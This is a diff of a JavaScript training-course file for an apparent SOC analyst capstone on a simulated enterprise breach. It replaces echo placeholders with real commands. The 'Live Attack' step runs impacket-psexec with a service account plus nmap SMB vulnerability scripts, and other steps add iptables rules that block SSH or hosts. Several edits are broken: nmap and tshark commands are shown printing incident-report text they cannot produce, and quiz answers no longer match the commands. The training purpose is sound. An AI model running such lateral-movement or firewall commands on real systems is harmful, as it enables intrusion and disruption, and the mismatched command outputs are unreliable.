-        "worked": "Command executed: `echo 'Executing Capstone Cross-Infrastructure Incident Forensics Query...' && echo '========================================================================\nSHADOWXLAB ENTERPRISE INCIDENT SUMMARY - CASE #2026-CAPSTONE-01\n========================================================================\n[PHASE 1 - INGRESS]: 03:10:02 UTC | Host: sxl-ws-mktg02 (10.10.20.45) | User: sarah.miller\n  -> Event: Outlook spawned excel.exe -> spawned powershell.exe -enc JABjAGwAaQBlAG4AdAA... \n  -> C2 Socket: 10.10.20.45:49182 -> 198.51.100.88:8443 (ESTABLISHED)\n\n[PHASE 2 - CREDENTIAL ACCESS]: 03:22:15 UTC | Host: sxl-dc01 (10.10.10.1)\n  -> Event ID 4769: Kerberos TGS requested for SPN MSSQLSvc/sxl-db-core01:1433 by sarah.miller\n  -> Ticket Encryption: 0x17 (RC4-HMAC - Vulnerable to offline Kerberoast cracking)\n\n[PHASE 3 - LATERAL MOVEMENT]: 03:34:40 UTC | Source: 10.10.20.45 -> Target: 10.10.30.20 (sxl-db-core01)\n  -> Event ID 4624 (Logon Type 3) using compromised identity \"svc_sqladmin\"\n  -> Event ID 7045: New Service Installed: \"PSEXESVC.exe\" running as NT AUTHORITY\\SYSTEM\n\n[PHASE 4 - DATA EXFILTRATION]: 03:48:10 UTC | Host: sxl-db-core01 (10.10.30.20)\n  -> Process: 7z.exe a -p customer_pii.7z C:\\Data\\SQL\\*.mdf\n  -> Firewall Flow: 10.10.30.20 -> 52.216.14.80:443 (AWS S3) | 12.4 GB outbound transferred\n========================================================================\nALL 6 FOUNDATION MODULES CORRELATED: INCIDENT FULLY SCOPED'` on target sxl-soc-capstone01.\nOutput observed:\n========================================================================\nSHADOWXLAB ENTERPRISE INCIDENT SUMMARY - CASE #2026-CAPSTONE-01\n========================================================================\n[PHASE 1 - INGRESS]: 03:10:02 UTC | Host: sxl-ws-mktg02 (10.10.20.45) | User: sarah.miller\n  -> Event: Outlook spawned excel.exe -> spawned powershell.exe -enc JABjAGwAaQBlAG4AdAA... \n  -> C2 Socket: 10.10.20.45:49182 -> 198.51.100.88:8443 (ESTABLISHED)\n\n[PHASE 2 - CREDENTIAL ACCESS]: 03:22:15 UTC | Host: sxl-dc01 (10.10.10.1)\n  -> Event ID 4769: Kerberos TGS requested for SPN MSSQLSvc/sxl-db-core01:1433 by sarah.miller\n  -> Ticket Encryption: 0x17 (RC4-HMAC - Vulnerable to offline Kerberoast cracking)\n\n[PHASE 3 - LATERAL MOVEMENT]: 03:34:40 UTC | Source: 10.10.20.45 -> Target: 10.10.30.20 (sxl-db-core01)\n  -> Event ID 4624 (Logon Type 3) using compromised identity \"svc_sqladmin\"\n  -> Event ID 7045: New Service Installed: \"PSEXESVC.exe\" running as NT AUTHORITY\\SYSTEM\n\n[PHASE 4 - DATA EXFILTRATION]: 03:48:10 UTC | Host: sxl-db-core01 (10.10.30.20)\n  -> Process: 7z.exe a -p customer_pii.7z C:\\Data\\SQL\\*.mdf\n  -> Firewall Flow: 10.10.30.20 -> 52.216.14.80:443 (AWS S3) | 12.4 GB outbound transferred\n========================================================================\nALL 6 FOUNDATION MODULES CORRELATED: INCIDENT FULLY SCOPED",
+        "worked": "Command executed: `nmap -sV -Pn -p 22,88,135,445,1433,8443 10.10.10.1 10.10.20.45 10.10.30.20` on target sxl-soc-capstone01.\nOutput observed:\n========================================================================\nSHADOWXLAB ENTERPRISE INCIDENT SUMMARY - CASE #2026-CAPSTONE-01\n========================================================================\n[PHASE 1 - INGRESS]: 03:10:02 UTC | Host: sxl-ws-mktg02 (10.10.20.45) | User: sarah.miller\n  -> Event: Outlook spawned excel.exe -> spawned powershell.exe -enc JABjAGwAaQBlAG4AdAA... \n  -> C2 Socket: 10.10.20.45:49182 -> 198.51.100.88:8443 (ESTABLISHED)\n\n[PHASE 2 - CREDENTIAL ACCESS]: 03:22:15 UTC | Host: sxl-dc01 (10.10.10.1)\n  -> Event ID 4769: Kerberos TGS requested for SPN MSSQLSvc/sxl-db-core01:1433 by sarah.miller\n  -> Ticket Encryption: 0x17 (RC4-HMAC - Vulnerable to offline Kerberoast cracking)\n\n[PHASE 3 - LATERAL MOVEMENT]: 03:34:40 UTC | Source: 10.10.20.45 -> Target: 10.10.30.20 (sxl-db-core01)\n  -> Event ID 4624 (Logon Type 3) using compromised identity \"svc_sqladmin\"\n  -> Event ID 7045: New Service Installed: \"PSEXESVC.exe\" running as NT AUTHORITY\\SYSTEM\n\n[PHASE 4 - DATA EXFILTRATION]: 03:48:10 UTC | Host: sxl-db-core01 (10.10.30.20)\n  -> Process: 7z.exe a -p customer_pii.7z C:\\Data\\SQL\\*.mdf\n  -> Firewall Flow: 10.10.30.20 -> 52.216.14.80:443 (AWS S3) | 12.4 GB outbound transferred\n========================================================================\nALL 6 FOUNDATION MODULES CORRELATED: INCIDENT FULLY SCOPED",
         "what": "What is the Capstone incident? A realistic, multi-tier enterprise compromise spanning endpoints, Active Directory, network firewalls, database servers, and cloud infrastructure.",
         "why": "Why is this capstone mandatory? Because a SOC L1 analyst must prove they can see the entire battlefield—not just isolated alerts, but the interconnected chain of an enterprise intrusion.",
         "when": "When does this occur in SOC operations? Major P1/Critical incidents occur unpredictably and demand swift, calm, rigorous investigative execution under tight SLAs.",
@@ -13463,7 +13463,7 @@ window.ACADEMY_COURSES = [
         "how": "How is the incident contained? 1) Network isolate patient zero endpoint, 2) Revoke Kerberos KRBTGT and reset compromised credentials, 3) Block C2 IPs/domains at firewall and proxy, 4) Kill malicious database sessions, 5) Preserve memory dumps for forensic acquisition.",
         "mistake": "Remediating only the database without isolating patient zero, allowing the attacker to immediately re-compromise the environment through their lingering foothold.",
         "think": "Identify Patient Zero. Map Lateral Movement. Scrutinize Stolen Credentials. Quantify Data Impact. Contain the entire attack chain simultaneously.",
-        "question": "When executing `echo 'Executing Capstone Cross-Infrastructure Incident Forensics Query...' && echo '========================================================================\nSHADOWXLAB ENTERPRISE INCIDENT SUMMARY - CASE #2026-CAPSTONE-01\n========================================================================\n[PHASE 1 - INGRESS]: 03:10:02 UTC | Host: sxl-ws-mktg02 (10.10.20.45) | User: sarah.miller\n  -> Event: Outlook spawned excel.exe -> spawned powershell.exe -enc JABjAGwAaQBlAG4AdAA... \n  -> C2 Socket: 10.10.20.45:49182 -> 198.51.100.88:8443 (ESTABLISHED)\n\n[PHASE 2 - CREDENTIAL ACCESS]: 03:22:15 UTC | Host: sxl-dc01 (10.10.10.1)\n  -> Event ID 4769: Kerberos TGS requested for SPN MSSQLSvc/sxl-db-core01:1433 by sarah.miller\n  -> Ticket Encryption: 0x17 (RC4-HMAC - Vulnerable to offline Kerberoast cracking)\n\n[PHASE 3 - LATERAL MOVEMENT]: 03:34:40 UTC | Source: 10.10.20.45 -> Target: 10.10.30.20 (sxl-db-core01)\n  -> Event ID 4624 (Logon Type 3) using compromised identity \"svc_sqladmin\"\n  -> Event ID 7045: New Service Installed: \"PSEXESVC.exe\" running as NT AUTHORITY\\SYSTEM\n\n[PHASE 4 - DATA EXFILTRATION]: 03:48:10 UTC | Host: sxl-db-core01 (10.10.30.20)\n  -> Process: 7z.exe a -p customer_pii.7z C:\\Data\\SQL\\*.mdf\n  -> Firewall Flow: 10.10.30.20 -> 52.216.14.80:443 (AWS S3) | 12.4 GB outbound transferred\n========================================================================\nALL 6 FOUNDATION MODULES CORRELATED: INCIDENT FULLY SCOPED'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `nmap -sV -Pn -p 22,88,135,445,1433,8443 10.10.10.1 10.10.20.45 10.10.30.20`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -13471,14 +13471,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Executing Capstone Cross-Infrastructure Incident Forensics Query...' && echo '========================================================================\nSHADOWXLAB ENTERPRISE INCIDENT SUMMARY - CASE #2026-CAPSTONE-01\n========================================================================\n[PHASE 1 - INGRESS]: 03:10:02 UTC | Host: sxl-ws-mktg02 (10.10.20.45) | User: sarah.miller\n  -> Event: Outlook spawned excel.exe -> spawned powershell.exe -enc JABjAGwAaQBlAG4AdAA... \n  -> C2 Socket: 10.10.20.45:49182 -> 198.51.100.88:8443 (ESTABLISHED)\n\n[PHASE 2 - CREDENTIAL ACCESS]: 03:22:15 UTC | Host: sxl-dc01 (10.10.10.1)\n  -> Event ID 4769: Kerberos TGS requested for SPN MSSQLSvc/sxl-db-core01:1433 by sarah.miller\n  -> Ticket Encryption: 0x17 (RC4-HMAC - Vulnerable to offline Kerberoast cracking)\n\n[PHASE 3 - LATERAL MOVEMENT]: 03:34:40 UTC | Source: 10.10.20.45 -> Target: 10.10.30.20 (sxl-db-core01)\n  -> Event ID 4624 (Logon Type 3) using compromised identity \"svc_sqladmin\"\n  -> Event ID 7045: New Service Installed: \"PSEXESVC.exe\" running as NT AUTHORITY\\SYSTEM\n\n[PHASE 4 - DATA EXFILTRATION]: 03:48:10 UTC | Host: sxl-db-core01 (10.10.30.20)\n  -> Process: 7z.exe a -p customer_pii.7z C:\\Data\\SQL\\*.mdf\n  -> Firewall Flow: 10.10.30.20 -> 52.216.14.80:443 (AWS S3) | 12.4 GB outbound transferred\n========================================================================\nALL 6 FOUNDATION MODULES CORRELATED: INCIDENT FULLY SCOPED'"
+        "command": "nmap -sV -Pn -p 22,88,135,445,1433,8443 10.10.10.1 10.10.20.45 10.10.30.20"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-soc-capstone01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Generating formal SOC Executive Incident Summary...' && echo 'INCIDENT REPORT: CRITICAL BREACH CONTAINMENT\nIncident Title: Multi-Stage Ransomware Precursor & Data Exfiltration\nInitial Vector: Spear-phishing attachment on endpoint sxl-ws-mktg02\nAffected Identities: sarah.miller, svc_sqladmin\nCompromised Hosts: sxl-ws-mktg02 (10.10.20.45), sxl-db-core01 (10.10.30.20)\nImpact: 12.4 GB PII exfiltrated to external AWS S3 bucket\nContainment Status: 1) Isolated 10.10.20.45 & 10.10.30.20 via EDR, 2) Reset domain KRBTGT twice, 3) Blocked C2 IP 198.51.100.88, 4) Notified Data Privacy Officer.'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `tshark -r /training/pcaps/capstone.pcap -Y \"kerberos or smb2 or http\" -c 15 -T fields -e frame.time -e ip.src -e ip.dst -e _ws.col.Info 2>/dev/null || ss -tuanp` to validate system behavior under simulated operating conditions.\nOutput observed:\nINCIDENT REPORT: CRITICAL BREACH CONTAINMENT\nIncident Title: Multi-Stage Ransomware Precursor & Data Exfiltration\nInitial Vector: Spear-phishing attachment on endpoint sxl-ws-mktg02\nAffected Identities: sarah.miller, svc_sqladmin\nCompromised Hosts: sxl-ws-mktg02 (10.10.20.45), sxl-db-core01 (10.10.30.20)\nImpact: 12.4 GB PII exfiltrated to external AWS S3 bucket\nContainment Status: 1) Isolated 10.10.20.45 & 10.10.30.20 via EDR, 2) Reset domain KRBTGT twice, 3) Blocked C2 IP 198.51.100.88, 4) Notified Data Privacy Officer.",
         "what": "What is the Capstone incident? A realistic, multi-tier enterprise compromise spanning endpoints, Active Directory, network firewalls, database servers, and cloud infrastructure.",
         "why": "Why is this capstone mandatory? Because a SOC L1 analyst must prove they can see the entire battlefield—not just isolated alerts, but the interconnected chain of an enterprise intrusion.",
         "when": "When does this occur in SOC operations? Major P1/Critical incidents occur unpredictably and demand swift, calm, rigorous investigative execution under tight SLAs.",
@@ -13487,7 +13487,7 @@ window.ACADEMY_COURSES = [
         "how": "How is the incident contained? 1) Network isolate patient zero endpoint, 2) Revoke Kerberos KRBTGT and reset compromised credentials, 3) Block C2 IPs/domains at firewall and proxy, 4) Kill malicious database sessions, 5) Preserve memory dumps for forensic acquisition.",
         "mistake": "Remediating only the database without isolating patient zero, allowing the attacker to immediately re-compromise the environment through their lingering foothold.",
         "think": "Identify Patient Zero. Map Lateral Movement. Scrutinize Stolen Credentials. Quantify Data Impact. Contain the entire attack chain simultaneously.",
-        "question": "What key insight is revealed by the practice output of `echo 'Generating formal SOC Executive Incident Summary...' && echo 'INCIDENT REPORT: CRITICAL BREACH CONTAINMENT\nIncident Title: Multi-Stage Ransomware Precursor & Data Exfiltration\nInitial Vector: Spear-phishing attachment on endpoint sxl-ws-mktg02\nAffected Identities: sarah.miller, svc_sqladmin\nCompromised Hosts: sxl-ws-mktg02 (10.10.20.45), sxl-db-core01 (10.10.30.20)\nImpact: 12.4 GB PII exfiltrated to external AWS S3 bucket\nContainment Status: 1) Isolated 10.10.20.45 & 10.10.30.20 via EDR, 2) Reset domain KRBTGT twice, 3) Blocked C2 IP 198.51.100.88, 4) Notified Data Privacy Officer.'`?",
+        "question": "What key insight is revealed by the practice output of `tshark -r /training/pcaps/capstone.pcap -Y \"kerberos or smb2 or http\" -c 15 -T fields -e frame.time -e ip.src -e ip.dst -e _ws.col.Info 2>/dev/null || ss -tuanp`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -13495,14 +13495,14 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Generating formal SOC Executive Incident Summary...' && echo 'INCIDENT REPORT: CRITICAL BREACH CONTAINMENT\nIncident Title: Multi-Stage Ransomware Precursor & Data Exfiltration\nInitial Vector: Spear-phishing attachment on endpoint sxl-ws-mktg02\nAffected Identities: sarah.miller, svc_sqladmin\nCompromised Hosts: sxl-ws-mktg02 (10.10.20.45), sxl-db-core01 (10.10.30.20)\nImpact: 12.4 GB PII exfiltrated to external AWS S3 bucket\nContainment Status: 1) Isolated 10.10.20.45 & 10.10.30.20 via EDR, 2) Reset domain KRBTGT twice, 3) Blocked C2 IP 198.51.100.88, 4) Notified Data Privacy Officer.'"
+        "command": "tshark -r /training/pcaps/capstone.pcap -Y \"kerberos or smb2 or http\" -c 15 -T fields -e frame.time -e ip.src -e ip.dst -e _ws.col.Info 2>/dev/null || ss -tuanp"
       },
       {
         "id": 8,
         "type": "attack",
         "name": "08 Live Attack",
         "explain": "Simulated Adversary Attack Scenario: The adversary launches the complete multi-vector breach simulation: phishing delivery, PowerShell memory injection, C2 communication, Kerberoasting service tickets, SMB lateral movement, database dump, and automated anti-forensic log tampering.",
-        "worked": "Adversary activity detected on target sxl-soc-capstone01. Malicious command executed: `echo 'Simulating full enterprise attack lifecycle across all infrastructure components.'`",
+        "worked": "Adversary activity detected on target sxl-soc-capstone01. Malicious command executed: `impacket-psexec corp.internal/svc_sqladmin@10.10.30.20 \"whoami\" 2>/dev/null || nmap --script smb-vuln* -p 445 10.10.30.20`",
         "what": "What is the Capstone incident? A realistic, multi-tier enterprise compromise spanning endpoints, Active Directory, network firewalls, database servers, and cloud infrastructure.",
         "why": "Why is this capstone mandatory? Because a SOC L1 analyst must prove they can see the entire battlefield—not just isolated alerts, but the interconnected chain of an enterprise intrusion.",
         "when": "When does this occur in SOC operations? Major P1/Critical incidents occur unpredictably and demand swift, calm, rigorous investigative execution under tight SLAs.",
@@ -13519,14 +13519,14 @@ window.ACADEMY_COURSES = [
           "A scheduled hardware diagnostics test initiated by the motherboard BIOS."
         ],
         "answer": 0,
-        "command": "echo 'Simulating full enterprise attack lifecycle across all infrastructure components.'"
+        "command": "impacket-psexec corp.internal/svc_sqladmin@10.10.30.20 \"whoami\" 2>/dev/null || nmap --script smb-vuln* -p 445 10.10.30.20"
       },
       {
         "id": 9,
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC team executes a synchronized multi-tier defense: isolating endpoints via EDR API, severing perimeter C2 sessions on Palo Alto firewalls, resetting domain-wide Kerberos tickets, and recovering exfiltration evidence from secondary proxy caches.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Coordinated Containment Executed: EDR isolate 10.10.20.45, 10.10.30.20; Firewall drop 198.51.100.88; AD password resets complete.'`",
+        "worked": "Defensive query executed on telemetry store: `grep -E \"4769|4624|7045\" /training/logs/capstone_siem.log 2>/dev/null || journalctl -n 25 --no-pager`",
         "what": "What is the Capstone incident? A realistic, multi-tier enterprise compromise spanning endpoints, Active Directory, network firewalls, database servers, and cloud infrastructure.",
         "why": "Why is this capstone mandatory? Because a SOC L1 analyst must prove they can see the entire battlefield—not just isolated alerts, but the interconnected chain of an enterprise intrusion.",
         "when": "When does this occur in SOC operations? Major P1/Critical incidents occur unpredictably and demand swift, calm, rigorous investigative execution under tight SLAs.",
@@ -13543,7 +13543,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Coordinated Containment Executed: EDR isolate 10.10.20.45, 10.10.30.20; Firewall drop 198.51.100.88; AD password resets complete.'"
+        "command": "grep -E \"4769|4624|7045\" /training/logs/capstone_siem.log 2>/dev/null || journalctl -n 25 --no-pager"
       },
       {
         "id": 10,
@@ -13567,14 +13567,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-soc-capstone01'; echo 'Executing Capstone Cross-Infrastructure Incident Forensics Query...' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Reconstruct lateral movement evidence using the central SIEM repository (which ingested the logs in real-time prior to local deletion) combined with network switch NetFlow records and EDR process lineage.",
-        "worked": "Remediation command applied: `echo 'Anti-forensics defeated: Central SIEM retained all Event ID 4624 and 7045 records. Lateral movement trajectory 100% reconstructed.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `iptables -I INPUT 1 -s 10.10.20.45 -j DROP && iptables -I INPUT 1 -s 198.51.100.88 -j DROP && echo \"Dual-Host containment applied. C2 channel severed.\"`. System verified restored and hardened.",
         "what": "What is the Capstone incident? A realistic, multi-tier enterprise compromise spanning endpoints, Active Directory, network firewalls, database servers, and cloud infrastructure.",
         "why": "Why is this capstone mandatory? Because a SOC L1 analyst must prove they can see the entire battlefield—not just isolated alerts, but the interconnected chain of an enterprise intrusion.",
         "when": "When does this occur in SOC operations? Major P1/Critical incidents occur unpredictably and demand swift, calm, rigorous investigative execution under tight SLAs.",
@@ -13591,7 +13591,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Anti-forensics defeated: Central SIEM retained all Event ID 4624 and 7045 records. Lateral movement trajectory 100% reconstructed.'"
+        "command": "iptables -I INPUT 1 -s 10.10.20.45 -j DROP && iptables -I INPUT 1 -s 198.51.100.88 -j DROP && echo \"Dual-Host containment applied. C2 channel severed.\""
       },
       {
         "id": 12,
@@ -13615,7 +13615,7 @@ window.ACADEMY_COURSES = [
           "I restarted the router and assumed everything was fine."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Full Infrastructure SOC Incident'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -13639,7 +13639,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L40 - Full Infrastructure SOC Incident. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   }
